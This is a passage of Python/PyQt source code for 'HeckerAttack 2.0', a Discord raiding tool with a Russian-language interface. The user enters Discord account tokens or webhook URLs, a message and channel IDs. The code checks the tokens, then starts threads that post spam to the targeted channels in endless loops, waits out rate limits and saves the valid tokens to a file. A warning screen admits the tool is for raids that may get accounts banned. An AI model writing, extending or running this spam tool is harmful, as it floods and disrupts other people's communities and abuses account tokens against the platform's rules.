        self.DelaySecHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                        'font: 87 8pt \'Segoe UI Black\';')
        self.DelaySecHint.setAlignment(QtCore.Qt.AlignLeading
                                       | QtCore.Qt.AlignLeft
                                       | QtCore.Qt.AlignVCenter)
        self.DelaySecHint.setObjectName('DeyalSecHint')
        self.PinButton = PYQTHoverButton(self.CentralWidget)
        self.PinButton.setGeometry(QtCore.QRect(215, 5, 31, 26))
        self.PinButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                     'border-radius: 5')
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(GetResourcePath('pin.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.PinButton.setIcon(icon1)
        self.PinButton.setObjectName('PinButton')
        self.HideButton = PYQTHoverButton(self.CentralWidget)
        self.HideButton.setGeometry(QtCore.QRect(180, 5, 31, 26))
        self.HideButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.HideButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(47, 49, 54);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border-radius: 5\n'
            '}')
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(GetResourcePath('hide.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.HideButton.setIcon(icon2)
        self.HideButton.setObjectName('HideButton')
        self.WindowMovementHitbox = PYQTHoverLabel(self.CentralWidget)
        self.WindowMovementHitbox.setGeometry(QtCore.QRect(125, 5, 56, 26))
        self.WindowMovementHitbox.setStyleSheet(
            'background-color: rgb(47, 49, 54)')
        self.WindowMovementHitbox.setObjectName('WindowMovementHitbox')
        self.MainBG.raise_()
        self.FormBG.raise_()
        self.WindowTitleLabel.raise_()
        self.CloseButton.raise_()
        self.AttackButton.raise_()
        self.LogsButton.raise_()
        self.TokenInput.raise_()
        self.TokenHint.raise_()
        self.TextHint.raise_()
        self.TextInput.raise_()
        self.DelayHint.raise_()
        self.AttackDelay.raise_()
        self.ChannelsHint.raise_()
        self.ChannelsInput.raise_()
        self.DelaySecHint.raise_()
        self.PinButton.raise_()
        self.HideButton.raise_()
        self.WindowMovementHitbox.raise_()
        MainWindow.setCentralWidget(self.CentralWidget)

        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        MainWindow.setWindowTitle('HeckerAttack 2.0')
        self.WindowTitleLabel.setText('HeckerAttack 2.0')
        self.CloseButton.setToolTip('Закрыть')
        self.AttackButton.setText('Атаковать')
        self.LogsButton.setText('Логи')
        self.TokenHint.setText('ТОКЕНЫ АККАУНТОВ, ВЕБХУКИ')
        self.TextHint.setText('ТЕКСТ')
        self.ChannelsHint.setText('ID КАНАЛОВ')
        self.DelayHint.setText('ЗАДЕРЖКА')
        self.DelaySecHint.setText('СЕК')
        self.PinButton.setToolTip('Закрепить окно на переднем плане')
        self.HideButton.setToolTip('Свернуть')

        self.WindowTitleLabel.HoverSignal.connect(self.ChangeWindowMovement)
        self.WindowMovementHitbox.HoverSignal.connect(
            self.ChangeWindowMovement)
        self.PinButton.HoverSignal.connect(self.PinButtonHoverEvent)

        self.CloseButton.clicked.connect(self.close)
        self.HideButton.clicked.connect(self.showMinimized)
        self.PinButton.clicked.connect(self.PinWindow)

        self.LogsButton.clicked.connect(self.ShowLogs)

        self.TokenHintChangeSignal.connect(self.ChangeTokenInput)
        self.ChannelsHintChangeSignal.connect(self.ChangeChannelHint)
        self.TextHintChangeSignal.connect(self.ChangeTextHint)
        self.MainButtonChangeSignal.connect(self.ChangeMainButton)

        self.AttackButton.clicked.connect(self.RunAttack_Thread)

    def ChangeTokenInput(self, event):
        self.TokenHint.setText(event['text'])
        self.TokenHint.setStyleSheet(event['style'])

    def ChangeChannelHint(self, event):
        self.ChannelsHint.setText(event['text'])
        self.ChannelsHint.setStyleSheet(event['style'])

    def ChangeTextHint(self, event):
        self.ChannelsHint.setText(event['text'])
        self.ChannelsHint.setStyleSheet(event['style'])

    def ChangeMainButton(self, event):
        self.AttackButton.setText(event['text'])
        self.AttackButton.setStyleSheet(event['style'])

    def RunAttack_Thread(self):
        Thread(target=self.RunAttack).start()

    def RunAttack(self):
        if self.IsWorking:
            self.IsWorking = False

            self.MainButtonChangeSignal.emit({
                'text':
                f'Атаковать',
                'style':
                'QPushButton {\n'
                '    background-color: rgb(88, 101, 242);\n'
                '    border-radius: 3;\n'
                '    font: 87 8pt \'Segoe UI Black\';\n'
                '    color: rgb(255, 255, 255);\n'
                '}\n'
                '\n'
                'QPushButton:hover {\n'
                '    background-color: rgb(81, 93, 224);\n'
                '    border-radius: 3;\n'
                '    font: 87 8pt \'Segoe UI Black\';\n'
                '    color: rgb(255, 255, 255);\n'
                '}'
                'QPushButton:pressed {\n'
                '    background-color: rgb(64, 73, 177);\n'
                '    border-radius: 3;\n'
                '    font: 87 8pt \'Segoe UI Black\';\n'
                '    color: rgb(255, 255, 255)\n'
                '}'
            })

            LogWrite('Атака остановлена.')
            return

        self.TokenHintChangeSignal.emit({
            'text':
            'ТОКЕНЫ АККАУНТОВ, ВЕБХУКИ',
            'style':
            'color: rgb(175, 177, 181);\n'
            'font: 87 8pt \'Segoe UI Black\';'
        })

        self.ChannelsHintChangeSignal.emit({
            'text':
            'ID КАНАЛОВ',
            'style':
            'color: rgb(175, 177, 181);\n'
            'font: 87 8pt \'Segoe UI Black\';'
        })

        self.MainButtonChangeSignal.emit({
            'text':
            'Атаковать',
            'style':
            'background-color: rgb(88, 101, 242);\n'
            'border-radius: 3;\n'
            'font: 87 8pt \'Segoe UI Black\';\n'
            'color: rgb(255, 255, 255);'
        })

        Tokens = self.TokenInput.toPlainText().split(
            '\n') if '\n' in self.TokenInput.toPlainText() else [
                self.TokenInput.toPlainText()
            ]

        LineID = 0

        if self.ChannelsInput.toPlainText() == '':
            for Token in Tokens:
                if not Token.startswith('https://'):
                    self.ChannelsHintChangeSignal.emit({
                        'text':
                        'ID КАНАЛОВ - ОБЯЗАТЕЛЬНО',
                        'style':
                        'color: rgb(243, 134, 136);\n'
                        'font: 87 8pt \'Segoe UI Black\';'
                    })
                    return

        for Token in Tokens:
            self.MainButtonChangeSignal.emit({
                'text':
                f'{LineID+1}/{len(Tokens)}',
                'style':
                'background-color: rgb(60, 63, 69);\n'
                'border-radius: 3;\n'
                'font: 87 8pt \'Segoe UI Black\';\n'
                'color: rgb(255, 255, 255);'
            })

            if Token.startswith('https://'):
                try:
                    LineID += 1

                    response = requests.get(
                        Token, headers={'User-Agent': self.UserAgent})

                    if not 'https://discord.com/api/webhooks/' in Token:
                        raise ValueError('Invalid Domain')

                    if not response.ok:
                        raise ValueError('Invalid Webhook')

                except Exception as e:
                    self.TokenHintChangeSignal.emit({
                        'text':
                        f'ТОКЕНЫ - #{LineID} неверен.',
                        'style':
                        'color: rgb(243, 134, 136);\n'
                        'font: 87 8pt \'Segoe UI Black\';'
                    })

                    self.MainButtonChangeSignal.emit({
                        'text':
                        f'Атаковать',
                        'style':
                        'QPushButton {\n'
                        '    background-color: rgb(88, 101, 242);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255);\n'
                        '}\n'
                        '\n'
                        'QPushButton:hover {\n'
                        '    background-color: rgb(81, 93, 224);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255);\n'
                        '}'
                        'QPushButton:pressed {\n'
                        '    background-color: rgb(64, 73, 177);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255)\n'
                        '}'
                    })

                    return

            else:
                try:
                    LineID += 1

                    Response = requests.get(
                        'https://discord.com/api/v9/users/@me',
                        headers={
                            'Authorization': Token,
                            'User-Agent': self.UserAgent
                        })

                    if Response.status_code == 401:
                        raise ValueError('401: Unauthorized')

                except:
                    self.TokenHintChangeSignal.emit({
                        'text':
                        f'ТОКЕНЫ - #{LineID} неверен.',
                        'style':
                        'color: rgb(243, 134, 136);\n'
                        'font: 87 8pt \'Segoe UI Black\';'
                    })

                    self.MainButtonChangeSignal.emit({
                        'text':
                        f'Атаковать',
                        'style':
                        'QPushButton {\n'
                        '    background-color: rgb(88, 101, 242);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255);\n'
                        '}\n'
                        '\n'
                        'QPushButton:hover {\n'
                        '    background-color: rgb(81, 93, 224);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255);\n'
                        '}'
                        'QPushButton:pressed {\n'
                        '    background-color: rgb(64, 73, 177);\n'
                        '    border-radius: 3;\n'
                        '    font: 87 8pt \'Segoe UI Black\';\n'
                        '    color: rgb(255, 255, 255)\n'
                        '}'
                    })

                    return

        self.MainButtonChangeSignal.emit({
            'text':
            f'Остановить',
            'style':
            'background-color: rgb(237, 66, 69);\n'
            'border-radius: 3;\n'
            'font: 87 8pt \'Segoe UI Black\';\n'
            'color: rgb(255, 255, 255);'
        })

        self.IsWorking = True

        LogWrite('Начинается атака!')

        for Token in Tokens:
            if Token.startswith('https://'):
                Thread(target=lambda: self.AttackOnWebhook(
                    Token, self.TextInput.toPlainText())).start()

            else:
                if '\n' in self.ChannelsInput.toPlainText():
                    Thread(target=lambda: self.AttackOnAccount(
                        Token, self.TextInput.toPlainText(),
                        self.ChannelsInput.toPlainText().split('\n'))).start()

                else:
                    Thread(target=lambda: self.AttackOnAccount(
                        Token, self.TextInput.toPlainText(),
                        [self.ChannelsInput.toPlainText()])).start()

        File = open(Home + '/' + 'heckerattack_2.0_valid_tokens.txt', 'w')

        ValidTokens = ''

        for Token in Tokens:
            if not Token.startswith('https://'):
                ValidTokens += Token + '\n'

        File.write(ValidTokens)
        File.close()

    def AttackOnWebhook(self, Url, Text):
        ChannelID = requests.get(Url, headers={
            'User-Agent': self.UserAgent
        }).json()['channel_id']

        while self.IsWorking:
            Response = requests.post(Url,
                                     headers={'User-Agent': self.UserAgent},
                                     json={'content': ParseString(Text)})

            if Response.ok:
                if self.IsWorking:
                    LogWrite(f'Вебхук ({ChannelID}) - спам отправлен.')

            else:
                if Response.status_code == 429:
                    RetryAfter = Response.json()['retry_after']

                    if self.IsWorking:
                        LogWrite(f'Вебхук ({ChannelID}) - ' +
                                 f'рейт лимит ({RetryAfter} сек).')

                    sleep(RetryAfter)

                else:
                    if self.IsWorking:
                        LogWrite(f'Вебхук ({ChannelID}) - ошибка: ' +
                                 f'({Response.json()["message"]})')

    def AttackOnAccount(self, Token, Text, ChannelIDs):
        ChannelIndex = 0
        Delay = self.AttackDelay.value()

        AccountUsername = requests.get('https://discord.com/api/v9/users/@me',
                                       headers={
                                           'Authorization': Token,
                                           'User-Agent': self.UserAgent
                                       }).json()

        AccountUsername = AccountUsername['username'] + '#' + AccountUsername[
            'discriminator']

        while self.IsWorking:
            Response = requests.post(f'https://discord.com/api/v9/channels/' +
                                     f'{ChannelIDs[ChannelIndex]}/messages',
                                     headers={
                                         'Authorization': Token,
                                         'User-Agent': self.UserAgent
                                     },
                                     json={'content': ParseString(Text)})

            if Response.ok:
                ChannelIndex += 1

                if ChannelIndex > len(ChannelIDs) - 1:
                    ChannelIndex = 0

                if self.IsWorking:
                    LogWrite(f'{AccountUsername} - спам в ' +
                             f'{ChannelIDs[ChannelIndex]} отправлен.')

                sleep(Delay)

            else:
                if Response.status_code == 429:
                    RetryAfter = Response.json()['retry_after']

                    if self.IsWorking:
                        LogWrite(f'{AccountUsername} - рейт лимит ' +
                                 f'({RetryAfter} сек).')

                    sleep(RetryAfter)

                else:
                    if self.IsWorking:
                        LogWrite(f'{AccountUsername} - ошибка: ' +
                                 f'({Response.json()["message"]})')

    def PinButtonHoverEvent(self, event):
        if not self.IsPinned:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(60, 63, 69);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(47, 49, 54);\n'
                    'border-radius: 5')
        else:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(53, 149, 84);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(59, 165, 93);\n'
                    'border-radius: 5')

    def ShowLogs(self):
        try:
            if not APPState.LogsWindowIsOpened:
                global LogsWindow_Worker

                LogsWindow_Worker = LogsWindow()
                LogsWindow_Worker.show()

        except Exception as e:
            print(e)

    def ChangeWindowMovement(self, event):
        if event == 'enterEvent':
            AllowWindowMovement.MainWindow = True
        else:
            AllowWindowMovement.MainWindow = False

    def PinWindow(self):
        self.IsPinned = not self.IsPinned

        if not self.IsPinned:
            self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                         'border-radius: 5')
        else:
            self.PinButton.setStyleSheet(
                'background-color: rgb(59, 165, 93);\n'
                'border-radius: 5')

        if self.IsPinned:
            self.setWindowFlags(self.windowFlags()
                                | QtCore.Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags()
                                & ~QtCore.Qt.WindowStaysOnTopHint)
            self.show()


class MainWindow(Ui_MainWindow):

    def __init__(self):
        super().__init__()
        self.InitWindow(self)

    def closeEvent(self, *args):
        _exit(0)

    def mousePressEvent(self, event):
        if AllowWindowMovement.MainWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = event.pos()
            except:
                pass

    def mouseReleaseEvent(self, event):
        if AllowWindowMovement.MainWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = None
            except:
                pass

    def mouseMoveEvent(self, event):
        if AllowWindowMovement.MainWindow:
            try:
                if not self.old_pos:
                    return
                delta = event.pos() - self.old_pos
                self.move(self.pos() + delta)
            except:
                pass


class Ui_WarningWindow(QtWidgets.QMainWindow):

    IsPinned = False

    def InitWindow(self, WarningWindow):
        WarningWindow.setObjectName('WarningWindow')
        WarningWindow.resize(296, 271)
        WarningWindow.setMinimumSize(QtCore.QSize(296, 271))
        WarningWindow.setMaximumSize(QtCore.QSize(296, 271))
        WarningWindow.setStyleSheet(
            'QToolTip {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border: black solid 1px;\n'
            '    border-radius: 3;\n'
            '    color: rgb(200, 200, 200);\n'
            '    font: 87 10pt \'Segoe UI Black\';\n'
            '}\n'
            '\n'
            'QScrollBar:vertical {\n'
            '    border: none;\n'
            '    background: rgb(32, 34, 37);\n'
            '    width: 15px;\n'
            '    margin: 15px 0 15px 0;\n'
            '}\n'
            'QScrollBar::handle:vertical {    \n'
            '    background-color: rgb(54, 57, 63);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::sub-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: top;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::sub-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::sub-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::add-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: bottom;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::add-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::add-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {\n'
            '    background: none;\n'
            '}\n'
            'QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {\n'
            '    background: none;\n'
            '}\n'
            '\n'
            'QPlainTextEdit {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}\n'
            '\n'
            'QPlainTextEdit:hover {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    border-style: solid;\n'
            '    border-width: 3;\n'
            '    border-color: rgb(41, 43, 47);\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}')
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.centralwidget = QtWidgets.QWidget(WarningWindow)
        self.centralwidget.setObjectName('centralwidget')
        self.MainBG = PYQTHoverLabel(self.centralwidget)
        self.MainBG.setGeometry(QtCore.QRect(0, 0, 296, 271))
        self.MainBG.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                  'border-radius: 10')
        self.MainBG.setObjectName('MainBG')
        self.FormBG = PYQTHoverLabel(self.centralwidget)
        self.FormBG.setGeometry(QtCore.QRect(5, 35, 286, 186))
        self.FormBG.setStyleSheet('background-color: rgb(54, 57, 63);\n'
                                  'border-radius: 10')
        self.FormBG.setObjectName('FormBG')
        self.CloseButton = PYQTHoverButton(self.centralwidget)
        self.CloseButton.setGeometry(QtCore.QRect(260, 5, 31, 26))
        self.CloseButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.CloseButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(234, 65, 68);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(216, 60, 63);\n'
            '    border-radius: 5\n'
            '}')
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(GetResourcePath('close.png')),
                       QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.CloseButton.setIcon(icon)
        self.CloseButton.setObjectName('CloseButton')
        self.PinButton = PYQTHoverButton(self.centralwidget)
        self.PinButton.setGeometry(QtCore.QRect(225, 5, 31, 26))
        self.PinButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                     'border-radius: 5')
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(GetResourcePath('pin.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.PinButton.setIcon(icon1)
        self.PinButton.setObjectName('PinButton')
        self.HideButton = PYQTHoverButton(self.centralwidget)
        self.HideButton.setGeometry(QtCore.QRect(190, 5, 31, 26))
        self.HideButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.HideButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(47, 49, 54);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border-radius: 5\n'
            '}')
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(GetResourcePath('hide.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.HideButton.setIcon(icon2)
        self.HideButton.setObjectName('HideButton')
        self.WindowTitleLabel = PYQTHoverLabel(self.centralwidget)
        self.WindowTitleLabel.setGeometry(QtCore.QRect(10, 5, 116, 26))
        self.WindowTitleLabel.setStyleSheet(
            'color: rgb(200, 200, 200);\n'
            'font: 87 10pt \'Segoe UI Black\';')
        self.WindowTitleLabel.setAlignment(QtCore.Qt.AlignLeading
                                           | QtCore.Qt.AlignLeft
                                           | QtCore.Qt.AlignVCenter)
        self.WindowTitleLabel.setObjectName('WindowTitleLabel')
        self.WindowMovementHitbox = PYQTHoverLabel(self.centralwidget)
        self.WindowMovementHitbox.setGeometry(QtCore.QRect(130, 5, 56, 26))
        self.WindowMovementHitbox.setStyleSheet(
            'background-color: rgb(47, 49, 54)')
        self.WindowMovementHitbox.setObjectName('WindowMovementHitbox')
        self.WarningIcon = PYQTHoverLabel(self.centralwidget)
        self.WarningIcon.setGeometry(QtCore.QRect(15, 45, 51, 51))
        self.WarningIcon.setPixmap(
            QtGui.QPixmap(GetResourcePath('warning.png')))
        self.WarningIcon.setScaledContents(True)
        self.WarningIcon.setAlignment(QtCore.Qt.AlignLeading
                                      | QtCore.Qt.AlignLeft
                                      | QtCore.Qt.AlignVCenter)
        self.WarningIcon.setObjectName('WarningIcon')
        self.WarningText = PYQTHoverLabel(self.centralwidget)
        self.WarningText.setGeometry(QtCore.QRect(75, 45, 211, 171))
        self.WarningText.setStyleSheet('color: rgb(175, 177, 181);\n'
                                       'font: 87 8pt \'Segoe UI Black\';')
        self.WarningText.setAlignment(QtCore.Qt.AlignLeading
                                      | QtCore.Qt.AlignLeft
                                      | QtCore.Qt.AlignTop)
        self.WarningText.setObjectName('WarningText')
        self.Accept = PYQTHoverButton(self.centralwidget)
        self.Accept.setGeometry(QtCore.QRect(145, 230, 141, 31))
        self.Accept.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.Accept.setStyleSheet('QPushButton {\n'
                                  '    background-color: rgb(88, 101, 242);\n'
                                  '    border-radius: 3;\n'
                                  '    font: 87 8pt \'Segoe UI Black\';\n'
                                  '    color: rgb(255, 255, 255);\n'
                                  '}\n'
                                  '\n'
                                  'QPushButton:hover {\n'
                                  '    background-color: rgb(81, 93, 224);\n'
                                  '    border-radius: 3;\n'
                                  '    font: 87 8pt \'Segoe UI Black\';\n'
                                  '    color: rgb(255, 255, 255);\n'
                                  '}')
        self.Accept.setObjectName('Accept')
        WarningWindow.setCentralWidget(self.centralwidget)

        QtCore.QMetaObject.connectSlotsByName(WarningWindow)

        WarningWindow.setWindowTitle('HeckerAttack 2.0 - Предупреждение')
        self.CloseButton.setToolTip('Закрыть')
        self.PinButton.setToolTip('Закрепить окно на переднем плане')
        self.HideButton.setToolTip('Свернуть')
        self.WindowTitleLabel.setText('Предупреждение')
        self.WarningText.setText('За использование этой программы,\n'
                                 'аккаунты, которые были\n'
                                 'использованы для рейда\n'
                                 'могут попасть под верификацию\n'
                                 'по номеру, или даже забанены!\n'
                                 '\n'
                                 'Всю ответственность за\n'
                                 'последствия от этой программы\n'
                                 'вы перекладываете на себя!\n'
                                 '\n'
                                 'Если вы не принимаете условия,\n'
                                 'закройте это окно.')
        self.Accept.setText('Я принимаю условия')

        self.WindowTitleLabel.HoverSignal.connect(self.ChangeWindowMovement)
        self.WindowMovementHitbox.HoverSignal.connect(
            self.ChangeWindowMovement)
        self.PinButton.HoverSignal.connect(self.PinButtonHoverEvent)

        self.CloseButton.clicked.connect(self.close)
        self.HideButton.clicked.connect(self.showMinimized)
        self.PinButton.clicked.connect(self.PinWindow)

        self.Accept.clicked.connect(self.AcceptRules)

    def PinButtonHoverEvent(self, event):
        if not self.IsPinned:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(60, 63, 69);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(47, 49, 54);\n'
                    'border-radius: 5')
        else:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(53, 149, 84);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(59, 165, 93);\n'
                    'border-radius: 5')

    def ChangeWindowMovement(self, event):
        if event == 'enterEvent':
            AllowWindowMovement.WarningWindow = True
        else:
            AllowWindowMovement.WarningWindow = False

    def PinWindow(self):
        self.IsPinned = not self.IsPinned

        if not self.IsPinned:
            self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                         'border-radius: 5')
        else:
            self.PinButton.setStyleSheet(
                'background-color: rgb(59, 165, 93);\n'
                'border-radius: 5')

        if self.IsPinned:
            self.setWindowFlags(self.windowFlags()
                                | QtCore.Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags()
                                & ~QtCore.Qt.WindowStaysOnTopHint)
            self.show()

    def AcceptRules(self):
        filename = Home + '\\heckerattack_2.0_accept.txt'
        open(filename, 'w').write('HeckerAttack 2.0: Вы приняли соглашение. ' +
                                  'Если вы удалите этот файл, ' +
                                  'то увидете предупреждение, ' +
                                  'которое было при первом запуске программы.')

        self.hide()

        global MainWindow_Worker

        MainWindow_Worker = MainWindow()
        MainWindow_Worker.show()


class WarningWindow(Ui_WarningWindow):

    def __init__(self):
        super().__init__()
        self.InitWindow(self)

    def closeEvent(self, *args):
        _exit(0)

    def mousePressEvent(self, event):
        if AllowWindowMovement.WarningWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = event.pos()
            except:
                pass

    def mouseReleaseEvent(self, event):
        if AllowWindowMovement.WarningWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = None
            except:
                pass

    def mouseMoveEvent(self, event):
        if AllowWindowMovement.WarningWindow:
            try:
                if not self.old_pos:
                    return
                delta = event.pos() - self.old_pos
                self.move(self.pos() + delta)
            except:
                pass


if __name__ == '__main__':
    if not isfile(Home + '\\heckerattack_2.0_accept.txt'):
        Application = QtWidgets.QApplication(argv)
        Window = WarningWindow()
        Window.show()
        _exit(Application.exec_())

    else:
        Application = QtWidgets.QApplication(argv)
        Window = MainWindow()
        Window.show()
        _exit(Application.exec_())
else:
    pass